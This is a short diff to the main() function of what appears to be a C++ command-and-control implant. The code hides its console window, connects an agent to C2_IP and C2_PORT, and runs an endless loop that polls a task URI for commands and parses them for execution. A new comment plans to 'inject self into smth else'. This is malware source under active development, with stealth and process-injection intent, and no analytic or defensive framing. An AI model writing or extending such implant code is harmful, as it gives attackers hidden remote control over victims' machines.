@@ -19,14 +19,14 @@ int main()
 {
 	// Hide console window
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
-	Agent agent;
+	Agent agent(C2_IP, C2_PORT);
 	Command cmdHandler;
-
+	// add inject self into smth else/
 	//Agent::Register();
 
 
 	while (true) {
-		std::string task = Agent::Get(TASK_URI);
+		std::string task = agent.Get(TASK_URI);
 
 		if (task != "") {
 			std::vector <std::string> Task = split(task);
